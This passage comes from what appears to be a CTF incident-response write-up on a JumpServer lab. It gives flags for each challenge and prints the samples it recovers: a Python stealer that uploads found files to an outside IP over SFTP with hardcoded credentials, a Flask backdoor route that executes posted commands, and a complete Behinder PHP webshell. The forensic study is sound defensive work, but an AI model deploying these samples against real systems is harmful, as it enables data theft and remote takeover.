    <span class="token string">'d'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'e'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'g'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'h'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'i'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'j'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'k'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'l'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'m'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'n'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'o'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'p'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span>
    <span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span>
    <span class="token string">'r'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span>
    <span class="token string">'s'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'t'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'u'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'v'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'w'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'x'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'y'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
    <span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token string">'呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span>
    <span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'玛巴轰'</span><span class="token punctuation">,</span>
    <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴轰'</span><span class="token punctuation">,</span>
    <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴玛巴轰'</span><span class="token punctuation">,</span>
    <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴玛巴玛巴轰'</span><span class="token punctuation">,</span>
    <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴轰'</span><span class="token punctuation">,</span>
    <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span>
    <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span>
    <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span>
    <span class="token string">'='</span><span class="token punctuation">:</span> <span class="token string">'妈个巴子轰'</span><span class="token punctuation">,</span>
    <span class="token string">'/'</span><span class="token punctuation">:</span> <span class="token string">'妈个巴卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'+'</span><span class="token punctuation">:</span> <span class="token string">'妈个巴达轰'</span><span class="token punctuation">,</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">decodemaba</span><span class="token punctuation">(</span>miwen<span class="token punctuation">)</span><span class="token punctuation">:</span>
    mingwen<span class="token operator">=</span><span class="token string">''</span>
    <span class="token comment"># print(f'密文&#123;&#123;miwen&#125;&#125;')</span>
    result <span class="token operator">=</span> re<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">r'(?&lt;=轰)'</span><span class="token punctuation">,</span> miwen<span class="token punctuation">)</span>
    <span class="token comment"># print(result)</span>
    <span class="token keyword">for</span> it <span class="token keyword">in</span> result<span class="token punctuation">:</span>
        <span class="token comment"># print(it)</span>
        <span class="token keyword">for</span> key<span class="token punctuation">,</span>val <span class="token keyword">in</span> encoding_rules<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># print(val)</span>
            <span class="token keyword">if</span> it<span class="token operator">==</span>val<span class="token punctuation">:</span>
                <span class="token comment"># print("找到明文密码")</span>
                <span class="token comment"># print(key)</span>
                mingwen <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">return</span> mingwen

<span class="token keyword">print</span><span class="token punctuation">(</span>decodemaba<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">//</span>jinitaimei</code></pre>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h3 id="应急响应-1"><a href="#应急响应-1" class="headerlink" title="应急响应-1"></a>应急响应-1</h3><blockquote>
<p>找到JumpServer堡垒机中flag标签的值</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpN6VL.png" alt="OpN6VL.png" loading="lazy"><br><code>[BrYeaVj54009rDIZzu4O]</code></p>
<h3 id="应急响应-2"><a href="#应急响应-2" class="headerlink" title="应急响应-2"></a>应急响应-2</h3><blockquote>
<p>提交攻击者第一次登录时间</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNXqi.png" alt="OpNXqi.png" loading="lazy"><br>[2024&#x2F;04&#x2F;11&#x2F;14:21:18]</p>
<h3 id="应急响应-3"><a href="#应急响应-3" class="headerlink" title="应急响应-3"></a>应急响应-3</h3><blockquote>
<p>提交攻击者源IP</p>
</blockquote>
<p>[192.168.1.4]</p>
<h3 id="应急响应-4"><a href="#应急响应-4" class="headerlink" title="应急响应-4"></a>应急响应-4</h3><blockquote>
<p>提交攻者使用的cve编号</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNurX.png" alt="OpNurX.png" loading="lazy"><br><code>[CVE-2024-29201]</code></p>
<h3 id="应急响应-5"><a href="#应急响应-5" class="headerlink" title="应急响应-5"></a>应急响应-5</h3><blockquote>
<p>提交攻击者留在Web服务器上的恶意程序的32位小写md5值</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNwij.png" alt="OpNwij.png" loading="lazy"><br>这几个试了以下发下home是恶意程序<br><img src="https://ooo.0x0.ooo/2024/04/22/OpN3Cx.png" alt="OpN3Cx.png" loading="lazy"><br><code>[84413332e4e7138adc5d6f1f688ddd69]</code></p>
<h3 id="应急响应-6"><a href="#应急响应-6" class="headerlink" title="应急响应-6"></a>应急响应-6</h3><blockquote>
<p>分析恶意程序连接地址和密码</p>
</blockquote>
<p>把&#x2F;root&#x2F;home导出然后解包可以拿到</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># visit https://tool.lu/pyc/ for more information</span>
<span class="token comment"># Version: Python 3.10</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> paramiko
<span class="token keyword">from</span> getpass <span class="token keyword">import</span> getpass

<span class="token keyword">def</span> <span class="token function">search_in_files</span><span class="token punctuation">(</span>directory<span class="token punctuation">,</span> search_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
<span class="token comment"># WARNING: Decompyle incomplete</span>


<span class="token keyword">def</span> <span class="token function">ssh</span><span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> remote_file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    hostname <span class="token operator">=</span> <span class="token string">'82.157.238.111'</span>
    port <span class="token operator">=</span> <span class="token number">22</span>
    username <span class="token operator">=</span> <span class="token string">'root'</span>
    password <span class="token operator">=</span> <span class="token string">'1qaz@WSX3edc'</span>
    client <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>
    client<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> port<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
    sftp <span class="token operator">=</span> client<span class="token punctuation">.</span>open_sftp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sftp<span class="token punctuation">.</span>put<span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> remote_file_path<span class="token punctuation">)</span>
    sftp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'''File </span><span class="token interpolation"><span class="token punctuation">&#123;</span>local_file_path<span class="token punctuation">&#125;</span></span><span class="token string"> uploaded to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>remote_file_path<span class="token punctuation">&#125;</span></span><span class="token string"> on </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string">'''</span></span><span class="token punctuation">)</span>

search_directory <span class="token operator">=</span> <span class="token string">'/'</span>
search_for_text <span class="token operator">=</span> <span class="token string">'passwod'</span>
<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span> search_in_files<span class="token punctuation">(</span>search_directory<span class="token punctuation">,</span> search_for_text<span class="token punctuation">)</span>
ssh<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
</code></pre>
<p>外链地址82.157.238.111 密码 1qaz@WSX3edc<br><code>[e695461c231aee4ed46b201efca18ff8-7da188c2e2d83e38b7d9e75e500f1af8]</code></p>
<h3 id="应急响应-7"><a href="#应急响应-7" class="headerlink" title="应急响应-7"></a>应急响应-7</h3><blockquote>
<p>提交存在反序列化漏洞的端口</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNwij.png" alt="OpNwij.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/04/22/OpeM4p.png" alt="OpeM4p.png" loading="lazy"><br><code>[8080]</code></p>
<h3 id="应急响应-8"><a href="#应急响应-8" class="headerlink" title="应急响应-8"></a>应急响应-8</h3><blockquote>
<p>提交攻击者使用的后门路由地址</p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python">$ cat app<span class="token punctuation">.</span>py


cat app<span class="token punctuation">.</span>py 

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify

<span class="token keyword">from</span> Database <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">import</span> os

<span class="token keyword">import</span> time

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/getinfo'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'Get'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    sql<span class="token operator">=</span><span class="token string">"select * from `user`"</span>

    data <span class="token operator">=</span> consql<span class="token punctuation">(</span>sql<span class="token operator">=</span>sql<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>

        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>

        <span class="token string">'data'</span><span class="token punctuation">:</span> data

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>response<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/system'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token comment"># print(os.system("dir"))</span>

    systemdata <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span>

    data <span class="token operator">=</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>systemdata<span class="token punctuation">)</span>

    <span class="token comment"># data = subprocess.run(systemdata)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># 把data的数据存储到log.txt</span>

    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flask/log.txt'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>

        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"-----"</span> <span class="token operator">+</span>systemdata<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>

    response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>

        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>

        <span class="token string">'data'</span><span class="token punctuation">:</span> data

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>response<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></code></pre>
<p>后门路由<code>/api/system</code><br><code>[948c4425bad48511fd6281d345ee69a1]</code></p>
<h3 id="应急响应-9"><a href="#应急响应-9" class="headerlink" title="应急响应-9"></a>应急响应-9</h3><blockquote>
<p>提交dnslog反弹域名</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeO6U.png" alt="OpeO6U.png" loading="lazy"><br><code>[86fedf00e173a0d531be569028fc1f6e]</code></p>
<h3 id="应急响应-10"><a href="#应急响应-10" class="headerlink" title="应急响应-10"></a>应急响应-10</h3><blockquote>
<p>提交第一次扫描器使用时间</p>
</blockquote>
<p>不懂</p>
<h3 id="应急响应-11"><a href="#应急响应-11" class="headerlink" title="应急响应-11"></a>应急响应-11</h3><blockquote>
<p>提交攻击者反弹shell使用的语言<br><img src="https://ooo.0x0.ooo/2024/04/22/OpeobY.png" alt="OpeobY.png" loading="lazy"><br>python<br><code>[23eeeb4347bdd26bfc6b7ee9a3b755dd]</code></p>
</blockquote>
<h3 id="应急响应-12"><a href="#应急响应-12" class="headerlink" title="应急响应-12"></a>应急响应-12</h3><blockquote>
<p>提交攻击者反弹shell的ip</p>
</blockquote>
<p>[82.157.238.174]</p>
<h3 id="应急响应-13"><a href="#应急响应-13" class="headerlink" title="应急响应-13"></a>应急响应-13</h3><blockquote>
<p>提交攻击者留下的账号</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/Ope5Yq.png" alt="Ope5Yq.png" loading="lazy"><br>[palu.com]</p>
<h3 id="应急响应-14"><a href="#应急响应-14" class="headerlink" title="应急响应-14"></a>应急响应-14</h3><blockquote>
<p>提交攻击者的后门账户密码</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeTqc.png" alt="OpeTqc.png" loading="lazy"><br>john跑一下palu.com的hash爆破出来<code>123123</code><br><code>[4297f44b13955235245b2497399d7a93]</code></p>
<h3 id="应急响应-15"><a href="#应急响应-15" class="headerlink" title="应急响应-15"></a>应急响应-15</h3><blockquote>
<p>提交测试数据条数</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeUAr.png" alt="OpeUAr.png" loading="lazy"><br>5条<br><code>[e4da3b7fbbce2345d7772b0674a318d5]</code></p>
<h3 id="应急响应-16"><a href="#应急响应-16" class="headerlink" title="应急响应-16"></a>应急响应-16</h3><blockquote>
<p>请提交攻击者留下的信息</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeWSM.png" alt="OpeWSM.png" loading="lazy"><br><code>[flag&#123;hi_palu_f10g&#125;]</code></p>
<h3 id="应急响应-17"><a href="#应急响应-17" class="headerlink" title="应急响应-17"></a>应急响应-17</h3><blockquote>
<p>请提交运维服务器上的恶意文件md5（小写32位md5值）</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpebCG.png" alt="OpebCG.png" loading="lazy"><br><code>[0fca0f847a45401c878d7a5303ddc1f8]</code></p>
<h3 id="应急响应-18"><a href="#应急响应-18" class="headerlink" title="应急响应-18"></a>应急响应-18</h3><blockquote>
<p>提交恶意文件的恶意函数</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/Opexn1.png" alt="Opexn1.png" loading="lazy"><br>helloworld下面有个libc，讲道理应该是haveadoor,但是是begingame<br><code>[ddd0599cda1fc289a617db148d75383b]</code></p>
<h3 id="应急响应-19"><a href="#应急响应-19" class="headerlink" title="应急响应-19"></a>应急响应-19</h3><blockquote>
<p>请提交攻击者恶意注册的恶意用户条数</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/Opez4I.png" alt="Opez4I.png" loading="lazy"><br>10个恶意用户<br><code>[d3d9446802a44259755d38e6d163e820]</code></p>
<h3 id="应急响应-20"><a href="#应急响应-20" class="headerlink" title="应急响应-20"></a>应急响应-20</h3><blockquote>
<p>请提交对博客系统的第一次扫描时间</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeF6D.png" alt="OpeF6D.png" loading="lazy"><br><code>[2024/04/16/21:03:46]</code></p>
<h3 id="应急响应-21"><a href="#应急响应-21" class="headerlink" title="应急响应-21"></a>应急响应-21</h3><blockquote>
<p>提交攻击者下载的文件</p>
</blockquote>
<p><code>[upload.zip]</code></p>
<h3 id="应急响应-22"><a href="#应急响应-22" class="headerlink" title="应急响应-22"></a>应急响应-22</h3><blockquote>
<p>请提交攻击者第一次下载服务器文件的时间</p>
</blockquote>
<p>没找到</p>
<h3 id="应急响应-23"><a href="#应急响应-23" class="headerlink" title="应急响应-23"></a>应急响应-23</h3><blockquote>
<p>请提交攻击者留下的冰蝎马的文件名称</p>
</blockquote>
<pre class="language-php" data-language="php"><code class="language-php">cat nidewen.php 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"1be873048db838ac"</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span>
<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token variable">$t</span><span class="token operator">=</span><span class="token string double-quoted-string">"base64_"</span><span class="token operator">.</span><span class="token string double-quoted-string">"decode"</span><span class="token punctuation">;</span>
<span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
<p><code>[nidewen.php]</code></p>
<h3 id="应急响应-24"><a href="#应急响应-24" class="headerlink" title="应急响应-24"></a>应急响应-24</h3><blockquote>
<p>提交冰蝎的链接密码</p>
</blockquote>
